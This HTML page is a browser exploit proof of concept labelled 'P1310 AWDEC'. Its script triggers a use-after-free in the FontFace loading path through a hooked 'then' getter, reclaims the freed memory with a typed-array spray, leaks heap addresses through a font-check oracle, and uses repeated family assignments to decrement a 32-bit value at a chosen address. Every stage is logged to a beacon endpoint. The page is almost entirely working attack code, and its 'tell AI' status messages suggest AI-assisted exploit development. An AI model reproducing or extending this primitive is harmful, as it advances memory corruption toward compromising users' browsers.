<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1310 AWDEC</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 15px/1.3 ui-monospace,monospace;padding:13px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#log{margin:58px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:#53d0e8;font-weight:700}.r .n{color:var(--dim)}
.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red)}.r.bad .t{color:var(--red)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">P1310 — arbitrary-address 32-bit DECREMENT (base-free write proof). Fresh-open each try.</div>
<div id="log"></div>
<script>
'use strict';
var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
function kls(s){s=(''+s).toLowerCase();if(/awdec-ok|win|found|addrof/.test(s))return'win';if(/hit|ok|dangling|done|registered|addr|seed/.test(s))return'ok';if(/err|miss|fail|crash|no-|none|nochange|collide|partial|noaddr/.test(s))return'bad';return'';}
function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>26)LOG.removeChild(LOG.firstChild);}
function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1310-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
B('VER','1');

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
function le32(u,o){return Number(le(u,o)&0xFFFFFFFFn);}
function wq(u,o,v){for(var i=0;i<8;i++){u[o+i]=Number(v&0xFFn);v>>=8n;}}
function wd(u,o,v){for(var i=0;i<4;i++){u[o+i]=(v>>>(8*i))&0xFF;}}
var buf=null,L1=null,L2=null,W=null,K=32,fired=false,sp=[],fs=null;
var FAM='zq7k3mx',MARK=0x6000,TGT_IDX=31;

try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
 fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
 if(fired)return undefined;fired=true;
 try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
 for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
   /* UNIQUE marker {from=0x6000,to=0x6000} at +0x30 on the TARGET buffer ONLY -> scan finds exactly one address */
   if(k===TGT_IDX){w[0x30]=0x00;w[0x31]=0x60;w[0x34]=0x00;w[0x35]=0x60;}
   sp.push(w);}
 return undefined;},set:function(){}});
try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
setTimeout(function(){if(!buf)scan();},450);

function scan(){
 if(buf)return;var hit=-1;
 for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){L1=a;L2=le(sp[i],0x68);buf=sp[i];hit=i;break;}}
 if(hit<0){B('MISS','CLOSE+REOPEN');S('miss — fresh-open','#4a2a12');return;}
 if(hit===TGT_IDX){B('TGT-COLLIDE','dangling==target idx — fresh-open');S('collide — fresh-open','#4a2a12');return;}
 B('HIT','L1=0x'+L1.toString(16)+' dIdx='+hit);
 var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
 buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
 buf[0x82]=3;
 if(!W){B('NOT-DANGLE','fresh-open');S('not dangling — fresh-open','#4a2a12');return;}
 B('DANGLING-OK','');S('dangling — making matchable + scanning…','#0c7a3a');
 setTimeout(go,100);
}
function chk(cp){try{return document.fonts.check('16px "'+FAM+'"',String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
function go(){
 if(window.__g)return;window.__g=true;
 for(var i=0x58;i<0x68;i++)buf[i]=0;
 wq(buf,0x08,L1);buf[0x10]=0;
 try{ W.family=FAM; B('SETFAM','ok'); }catch(e){ B('SETFAM-ERR',(''+(e&&e.message||e)).slice(0,40)); S('setFamily crashed','#4a2a12'); return; }
 try{ document.fonts.add(W); B('ADD','ok'); }catch(e){ B('ADD-ERR',(''+(e&&e.message||e)).slice(0,40)); }
 buf[0x82]=1;
 /* 192B UnicodeRange anchor (24 ranges) near the sprays */
 var ur='U+100-101';for(var i=1;i<24;i++){var a=0x200+i*2;ur+=',U+'+a.toString(16)+'-'+(a+1).toString(16);}
 var U=0n;
 try{ W.unicodeRange=ur; U=le(buf,0x20); B('ANCHOR','U=0x'+U.toString(16)); }catch(e){ B('UR-ERR',(''+(e&&e.message||e)).slice(0,40)); }
 /* oracle alive check */
 wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);var rA=chk(0x41);
 wq(buf,0x20,L1);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);var rB=chk(0x41);
 B('ORACLE','empty='+rA+' high='+rB);
 if(!(rA==='F'&&rB==='T')){B('ORA-NO-MATCH','cannot scan');return;}
 if(U===0n){B('NO-ANCHOR','no U');return;}
 /* find the TARGET buffer address: m_ranges -> {X+0x30,size1}; marked buffer has {0x6000,0x6000} so chk(0x6000)=F (covers) AND chk(0x6001)=T (not covered) */
 var A0=0n;
 for(var X=U-0x800n; X<U+0x800n; X+=0x10n){
   wq(buf,0x20,X+0x30n);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
   if(chk(MARK)==='F' && chk(MARK+1)==='T'){ A0=X; break; }
 }
 if(A0===0n){ B('NOADDR','marker not in U+/-0x800 — fresh-open/widen'); S('no addr — fresh-open','#4a2a12'); return; }
 B('ADDR','A0=0x'+A0.toString(16));

 /* ---- DECREMENT: seed target, let setFamily's RefPtr dtor decrement *(u32*)(A0+0x80 + refcountoff) ---- */
 var tgt=sp[TGT_IDX];
 wd(tgt,0x80,0x41414145);   /* hit if CSSValue refcount offset == +0 */
 wd(tgt,0x84,0x51515155);   /* hit if offset == +4 */
 var Xdec=A0+0x80n;
 var pre0=le32(tgt,0x80), pre4=le32(tgt,0x84);
 B('SEED','pre0=0x'+pre0.toString(16)+' pre4=0x'+pre4.toString(16)+' X=0x'+Xdec.toString(16));
 var N=4, famErr=false, nd=0;
 for(var n=0;n<N;n++){
   for(var i=0x58;i<0x68;i++)buf[i]=0; wq(buf,0x08,L1); buf[0x10]=0;   /* re-assert forge */
   wq(buf,0x18,Xdec);                                                  /* std::exchange stole 0x18 last call */
   try{ W.family='zz'+n; nd++; }catch(e){ famErr=true; B('FAM-ERR','n='+n+' '+(''+(e&&e.message||e)).slice(0,28)); break; }
 }
 /* restore buf to a safe shape before any further JS/GC */
 buf[3]=0x80; buf[0x82]=3; for(var i=0x58;i<0x68;i++)buf[i]=0;
 var post0=le32(tgt,0x80), post4=le32(tgt,0x84);
 var exp0=(pre0-nd)>>>0, exp4=(pre4-nd)>>>0;
 if(post0===exp0 && post4===pre4){ B('AWDEC-OK','off0 X=0x'+Xdec.toString(16)+' '+pre0.toString(16)+'->'+post0.toString(16)+' nd='+nd); S('AWDEC-OK off0 !!! base-free write','#0a7a2a'); }
 else if(post4===exp4 && post0===pre0){ B('AWDEC-OK','off4 X=0x'+(Xdec+4n).toString(16)+' '+pre4.toString(16)+'->'+post4.toString(16)+' nd='+nd); S('AWDEC-OK off4 !!! base-free write','#0a7a2a'); }
 else if(post0!==pre0 || post4!==pre4){ B('AWDEC-PARTIAL','d0='+((pre0-post0)|0)+' d4='+((pre4-post4)|0)+' p0=0x'+post0.toString(16)+' p4=0x'+post4.toString(16)+' nd='+nd); S('partial — tell AI','#4a2a12'); }
 else { B('AWDEC-NOCHANGE','pre0=0x'+pre0.toString(16)+' post0=0x'+post0.toString(16)+' pre4=0x'+pre4.toString(16)+' post4=0x'+post4.toString(16)+' nd='+nd); S('no change — tell AI','#4a2a12'); }
 B(famErr?'FAM-ERR-DONE':'FAM-DONE','nd='+nd);
 B('DONE','');
}
</script>
</body></html>
